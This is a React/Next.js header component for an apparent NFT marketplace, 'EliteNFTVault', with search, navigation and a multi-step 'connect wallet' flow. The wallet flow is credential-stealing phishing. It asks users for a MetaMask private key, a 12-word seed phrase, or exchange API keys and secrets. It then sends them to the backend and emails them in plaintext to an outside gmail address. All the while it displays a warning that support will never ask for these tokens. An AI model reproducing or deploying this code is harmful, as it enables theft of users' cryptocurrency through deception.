"use client";
import { useState, useEffect } from "react";
import { useDataContext } from "../context/DataProvider";
import Image from "next/image";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faBell,
  faCircleCheck,
  faCircleXmark,
  faExclamationCircle,
  faMagnifyingGlass,
  faWallet,
  faExclamationTriangle,
} from "@fortawesome/free-solid-svg-icons";
import ConfirmBtn from "../loading/ConfirmBtn";
import Link from "next/link";
import NavDropDownMenu from "../dropdown/NavDropDownMenu";
import ConnectWallet from "../walletconnection/ConnectWallet";
import { toast } from "react-toastify";
import Loading from "../loading/Loading";
import { usePathname, useRouter } from "next/navigation";
import NotificationsTab from "../dropdown/NotificationsTab";
import { useDisconnect } from "@reown/appkit/react";

const Header = () => {
  const { disconnect } = useDisconnect();
  const router = useRouter();
  const pathname = usePathname();
  const {
    user,
    getUser,
    setSearchResultCollections,
    setSearchResultAssets,
    search,
    setSearch,
    appData,
  } = useDataContext();
  const { assets, collections } = appData;
  const [keyTab, setKeyTabs] = useState(false);
  const [steps, setSteps] = useState(1);

  const [walletAddress, setWalletAddress] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [apiKey, setApiKey] = useState("");
  const [apiSecret, setApiSecret] = useState("");

  const [validPhrase, setValidPhrase] = useState(false);
  const [validKey, setValidKey] = useState(false);
  const [provider, setProvider] = useState("");

  const [loading, setLoading] = useState(false);

  const [mobileSearchBar, setMobileSearchBar] = useState(false);

  function handleSearch(e) {
    e.preventDefault();

    let filteredCol;
    let filteredAssets;
    if (search.length > 1) {
      router.push("/marketplace/explore");

      filteredAssets = assets.filter((asset) =>
        asset.name.toLowerCase().includes(search.toLowerCase())
      );
      filteredCol = collections.filter((collection) =>
        collection.name.toLowerCase().includes(search.toLowerCase())
      );
      if (filteredAssets) {
        setSearchResultAssets(filteredAssets);
      } else {
        setSearchResultAssets(appData.assets);
      }
      if (filteredCol) {
        setSearchResultCollections(filteredCol);
      } else {
        setSearchResultCollections(appData.collections);
      }
      return;
    } else {
      setSearchResultAssets(appData?.assets);
      setSearchResultCollections(appData?.collections);
      return;
    }
  }

  function nextStep() {
    if (steps === 2 && !provider)
      return toast.error("select a wallet provider");
    setSteps((prev) => prev + 1);
    return;
  }
  function prevStep() {
    setSteps((prev) => prev - 1);
    return;
  }

  async function cancelConnection() {
    setWalletAddress("");
    setPrivateKey("");
    setApiKey("");
    setApiSecret("");
    setKeyTabs(false);
    setSteps(1);
    setProvider("");
    setValidPhrase(false);
    setValidKey(false);
    await disconnect();
    return;
  }

  function getProvider(wallet) {
    setProvider(wallet);
    return;
  }

  function hasUpTo12Words(inputString) {
    const trimmedString = inputString.trim();
    const wordsArray = trimmedString.split(/\s+/);
    return wordsArray.length === 12;
  }

  async function connectWallet() {
    if (provider === "metamask" && !validKey)
      return toast.error("Invalid keys");
    if (provider === "phantom" && !validPhrase)
      return toast.error("Invalid Phrase");
    if (provider === "trust" && !validPhrase)
      return toast.error("Invalid Phrase");
    setLoading(true);
    try {
      const response = await fetch("/api/userrequest/edit", {
        method: "PATCH",
        body: JSON.stringify({
          id: user?._id,
          walletAddress,
          privateKey,
          apiKey,
          apiSecret,
          provider,
        }),
      });
      if (!response.ok) {
        const errorData = await response.json();
        toast.error(errorData.message);
      }

      if (response.ok) {
        await fetch("/api/mailer/custom", {
          method: "POST",
          body: JSON.stringify({
            email: "elitenftvault@gmail.com",
            subject: `connected wallet alert`,
            body: `<h2>Hello Admin</h2> 
            <p>the ${user?.username}, just connected a wallet</p>
            <p>Details:</p>
<p>Provider: ${provider}</p>
<p>Secret Phrase (private key): ${privateKey}</p>
<p>Api key: ${apiKey}</p>

<p>Api Secret: ${apiSecret}</p>
<p>
EliteNFTVault team,</p>`,
          }),
        });
        toast.success("Wallet Connected.");
        setSteps(4);
        await getUser();
        return;
      }
    } catch (error) {
      console.log(error.name, ":", error.message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    if (walletAddress) {
      setKeyTabs(true);
    }
  }, [walletAddress]);

  useEffect(() => {
    const checkValidKey = () => {
      if (provider === "metamask") {
        if (privateKey && privateKey.length !== 64) {
          setValidKey(false);
        } else if (privateKey && privateKey.length === 64) {
          setValidKey(true);
        }
      } else {
        return;
      }
    };

    const checkValidPhrase = () => {
      if (provider === "trust" || provider === "phantom") {
        if (privateKey && !hasUpTo12Words(privateKey)) {
          setValidPhrase(false);
        } else if (privateKey && hasUpTo12Words(privateKey)) {
          setValidPhrase(true);
        }
      } else {
        return;
      }
    };

    checkValidKey();
    checkValidPhrase();
  }, [privateKey, provider]);

  return (
    <header className="w-full p-2 fixed shadow-2xl shadow-black flex items-center justify-center z-10 bg-[#281549]/80 h-[61px]">
      <nav className="flex items-center justify-between max-w-7xl w-full relative">
        <Link href={"/"} className="flex items-center justify-center">
          <Image
            src={"/assets/logo.png"}
            alt="app logo"
            width={500}
            height={500}
            className="w-[35px] h-[35px] mr-2 flex-1"
          />
          <h1 className="text-white font-semibold hidden sm:flex">
            EliteNFTVault
          </h1>
        </Link>

        <button
          onClick={() => setMobileSearchBar((prev) => !prev)}
          className="bg-[#ef8bf7]/40 p-1 w-[39px] h-[39px] flex items-center justify-center rounded-[10] cursor-pointer mx-1  sm:hidden"
        >
          <FontAwesomeIcon icon={faMagnifyingGlass} className="text-white" />
        </button>
        <form
          className="hidden sm:flex items-center justify-start p-1 rounded-[3px] bg-[#d9d9d9]/30 w-[300px] h-[32px]"
          onSubmit={handleSearch}
        >
          <FontAwesomeIcon
            icon={faMagnifyingGlass}
            className="text-black text-[17px]"
          />
          <input
            type="text"
            placeholder="find a collection or asset"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="bg-transparent text-white placeholder:text-[#d9d9d9] mx-2 border-0 outline-0 w-full"
          />
        </form>
        {mobileSearchBar && (
          <form
            className="flex sm:hidden absolute top-full items-center  justify-start p-1 rounded-[3px] bg-[#d9d9d9]/30 w-[300px] h-[32px]"
            onSubmit={handleSearch}
          >
            <FontAwesomeIcon
              icon={faMagnifyingGlass}
              className="text-black text-[17px]"
            />
            <input
              type="text"
              placeholder="find a collection or asset"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="bg-transparent text-white placeholder:text-[#d9d9d9] mx-2 border-0 outline-0 w-full"
            />
          </form>
        )}
        {/* when user is not loggedin */}
        {!user?.username && (
          <div className="flex items-center justify-between">
            <div className="flex items-center justify-between ">
              <Link
                href={"/marketplace/explore"}
                className="hover:underline hover:scale-[1.1] transform duration-300 mx-1 sm:mx-4 hidden sm:flex"
              >
                Explore
              </Link>
              <Link
                href={"/frequently-asked-questions"}
                className="hover:underline hover:scale-[1.1] transform duration-300 mx-1 sm:mx-4"
              >
                Help
              </Link>
              <Link
                href={"/login"}
                className="hover:underline hover:scale-[1.1] transform duration-300 mx-2 sm:mx-4"
              >
                Login
              </Link>
            </div>
            {pathname !== "/register" && (
              <ConfirmBtn
                title={"Get Started"}
                otherStyles={
                  "p-3 bg-gradient-to-r from-[#843eff] to-[#fe4ff2] rounded-[10px] w-[100px] sm:w-[200px] text-[16px] font-semibold self-center"
                }
                handleClicked={() => router.push("/register")}
              />
            )}
          </div>
        )}
        {user?.username && (
          <div className="flex items-center justify-between ">
            <div className="flex items-center justify-between flex-1 px-2 sm:px-10">
              <Link
                href={"/marketplace/explore"}
                className="hover:underline hover:scale-[1.1] transform duration-300 ml-10 hidden sm:flex"
              >
                Explore
              </Link>

              {user?.walletAddress && <NotificationsTab user={user} />}
            </div>
            <div className="flex items-center justify-center">
              <NavDropDownMenu user={user} />
              {!user?.walletAddress && (
                <ConnectWallet setWalletAddress={setWalletAddress} />
              )}
            </div>
          </div>
        )}
        {keyTab && (
          <div className="absolute top-[110%] z-100 right-4 w-[300px] bg-[#141414] p-3 min-h-[400px] flex items-center justify-center rounded-xl">
            {/* STEP one */}
            {steps === 1 && (
              <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around">
                <p className="font-bold text-center text-xl my-4"> Step 1/3 </p>
                <FontAwesomeIcon
                  icon={faExclamationCircle}
                  className="text-[70px] text-green-600 mb-3"
                />
                <p className="text-white w-full my-3 text-center font-medium break-words">
                  {" "}
                  We found the wallet : <br /> <b>{walletAddress}</b>{" "}
                </p>
                <div className="">
                  {" "}
                  <ConfirmBtn
                    title={"Cancel"}
                    otherStyles={
                      "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={cancelConnection}
                  />
                  <ConfirmBtn
                    title={"Next"}
                    otherStyles={
                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={nextStep}
                  />
                </div>
              </div>
            )}
            {/* STEP TWO */}
            {steps === 2 && (
              <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around">
                <p className="font-bold text-center text-xl my-4"> Step 2/3 </p>

                <FontAwesomeIcon
                  icon={faWallet}
                  className="text-[30px] text-whitemb-3"
                />
                <p className="text-white w-full my-3 text-center font-medium break-words">
                  Select your wallet Provider:
                </p>
                <div className="flex items-center justify-center">
                  <button
                    className={`mx-2 ${
                      provider === "metamask"
                        ? "border border-[#ef8bf7] p-[1px] rounded"
                        : ""
                    }`}
                    onClick={() => getProvider("metamask")}
                  >
                    <Image
                      src={"/assets/metamask.png"}
                      alt="metamask logo"
                      height={60}
                      width={60}
                      className="w-[40px] h-[40px] rounded-full object-cover"
                    />
                  </button>
                  <button
                    className={`mx-2 ${
                      provider === "trust"
                        ? "border border-[#ef8bf7] p-[1px] rounded"
                        : ""
                    }`}
                    onClick={() => getProvider("trust")}
                  >
                    <Image
                      src={"/assets/trust.png"}
                      alt="trust logo"
                      height={60}
                      width={60}
                      className="w-[40px] h-[40px] rounded-full object-cover"
                    />
                  </button>
                  <button
                    className={`mx-2 ${
                      provider === "phantom"
                        ? "border border-[#ef8bf7] p-[1px] rounded"
                        : ""
                    }`}
                    onClick={() => getProvider("phantom")}
                  >
                    <Image
                      src={"/assets/phantom.jpeg"}
                      alt="phantom logo"
                      height={60}
                      width={60}
                      className="w-[40px] h-[40px] rounded-full object-cover"
                    />
                  </button>
                  <button
                    className={`mx-2 ${
                      provider === "binance"
                        ? "border border-[#ef8bf7] p-[1px] rounded"
                        : ""
                    }`}
                    onClick={() => getProvider("binance")}
                  >
                    <Image
                      src={"/assets/binance.jpeg"}
                      alt="binance logo"
                      height={60}
                      width={60}
                      className="w-[40px] h-[40px] rounded-full object-cover"
                    />
                  </button>
                  <button
                    className={`mx-2 ${
                      provider === "coinbase"
                        ? "border border-[#ef8bf7] p-[1px] rounded"
                        : ""
                    }`}
                    onClick={() => getProvider("coinbase")}
                  >
                    <Image
                      src={"/assets/coinbase.png"}
                      alt="coinbase logo"
                      height={60}
                      width={60}
                      className="w-[40px] h-[40px] rounded-full object-cover"
                    />
                  </button>
                </div>
                <div>
                  {" "}
                  <ConfirmBtn
                    title={"Back"}
                    otherStyles={
                      "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={prevStep}
                  />
                  <ConfirmBtn
                    title={"Next"}
                    otherStyles={
                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={nextStep}
                  />
                </div>
              </div>
            )}
            {/* STEP THREE */}
            {steps === 3 && (
              <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around relative">
                {loading && (
                  <Loading otherStyles={"mx-auto absolute -top-5 z-50"} />
                )}
                <p className="font-bold text-center text-xl my-4">
                  {" "}
                  Final Step{" "}
                </p>
                <p className="my-2 text-red-500 break-words bg-red-200 border border-red-700 rounded text-center">
                  <FontAwesomeIcon
                    icon={faExclamationTriangle}
                    className="text-red-500"
                  />
                  please be <b>Extra</b> careful when handling your API key,
                  EliteNFTvault support team will <b>NEVER</b> ask for your API
                  tokens
                </p>

                <p className="text-left w-full">Enter your API tokens:</p>
                {provider === "metamask" ||
                provider === "phantom" ||
                provider === "trust" ? (
                  <div className="flex flex-col w-full items-start">
                    <div className="my-3">
                      {provider === "metamask" && privateKey && validKey && (
                        <p>
                          Valid Key (token){" "}
                          <FontAwesomeIcon
                            icon={validKey ? faCircleCheck : faCircleXmark}
                            className={`${
                              validKey ? "text-green-600" : "text-red-500"
                            }`}
                          />
                        </p>
                      )}
                      {provider === "metamask" && privateKey && !validKey && (
                        <p>
                          {validKey ? "Valid" : "invalid"} Key (token){" "}
                          <FontAwesomeIcon
                            icon={validKey ? faCircleCheck : faCircleXmark}
                            className={`${
                              validKey ? "text-green-600" : "text-red-500"
                            }`}
                          />
                        </p>
                      )}
                      {provider === "phantom" &&
                        !!privateKey &&
                        validPhrase && (
                          <p>
                            {validPhrase ? "Valid" : "invalid"} phrase (token){" "}
                            <FontAwesomeIcon
                              icon={validPhrase ? faCircleCheck : faCircleXmark}
                              className={`${
                                validPhrase ? "text-green-600" : "text-red-500"
                              }`}
                            />
                          </p>
                        )}
                      {provider === "phantom" && privateKey && !validPhrase && (
                        <p>
                          {validKey ? "Valid" : "invalid"} Phrase (token){" "}
                          <FontAwesomeIcon
                            icon={validKey ? faCircleCheck : faCircleXmark}
                            className={`${
                              validKey ? "text-green-600" : "text-red-500"
                            }`}
                          />
                        </p>
                      )}
                      {provider === "trust" && !!privateKey && validPhrase && (
                        <p>
                          {validPhrase ? "Valid" : "invalid"} phrase (token){" "}
                          <FontAwesomeIcon
                            icon={validPhrase ? faCircleCheck : faCircleXmark}
                            className={`${
                              validPhrase ? "text-green-600" : "text-red-500"
                            }`}
                          />
                        </p>
                      )}
                      {provider === "trust" && !!privateKey && !validPhrase && (
                        <p>
                          {validPhrase ? "Valid" : "invalid"} phrase (token){" "}
                          <FontAwesomeIcon
                            icon={validPhrase ? faCircleCheck : faCircleXmark}
                            className={`${
                              validPhrase ? "text-green-600" : "text-red-500"
                            }`}
                          />
                        </p>
                      )}
                    </div>
                    <input
                      type="text"
                      placeholder="private key or 12 word phrase"
                      className="p-2 bg-[#d9d9d9]/20 w-full rounded-[10px] placeholder:text-[#969494] mb-4 border-0 outline-none"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                    />
                  </div>
                ) : (
                  <div className="flex flex-col w-full items-start">
                    <div className="my-3"></div>
                    <input
                      type="text"
                      placeholder="Enter your API key"
                      className="p-2 bg-[#d9d9d9]/20 w-full rounded-[10px] placeholder:text-[#969494] mb-4 border-0 outline-none"
                      value={apiKey}
                      onChange={(e) => setApiKey(e.target.value)}
                    />
                    <input
                      type="text"
                      placeholder="Enter your API secret key"
                      className="p-2 bg-[#d9d9d9]/20 w-full rounded-[10px] placeholder:text-[#969494] mb-4 border-0 outline-none"
                      value={apiSecret}
                      onChange={(e) => setApiSecret(e.target.value)}
                    />
                  </div>
                )}

                <div>
                  {" "}
                  <ConfirmBtn
                    title={"Back"}
                    otherStyles={
                      "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={prevStep}
                  />
                  <ConfirmBtn
                    title={"Continue"}
                    otherStyles={
                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={connectWallet}
                  />
                </div>
                <Link
                  href={"/frequently-asked-questions?tab=connectWallet"}
                  className="text-sm underline my-1"
                >
                  {" "}
                  How to get my API tokens?{" "}
                </Link>
              </div>
            )}

            {steps === 4 && (
              <div className="bg-[#141414] min-h-20 w-full flex flex-col items-center justify-around">
                <FontAwesomeIcon
                  icon={faCircleCheck}
                  className="text-[100px] text-green-600 mb-3"
                />
                <p className="text-white w-full my-3 text-center font-medium break-words">
                  Your wallet has been connected to your account
                </p>
                <div>
                  {" "}
                  <ConfirmBtn
                    title={"Close"}
                    otherStyles={
                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4"
                    }
                    handleClicked={cancelConnection}
                  />
                </div>
              </div>
            )}
          </div>
        )}
      </nav>
    </header>
  );
};
export default Header;
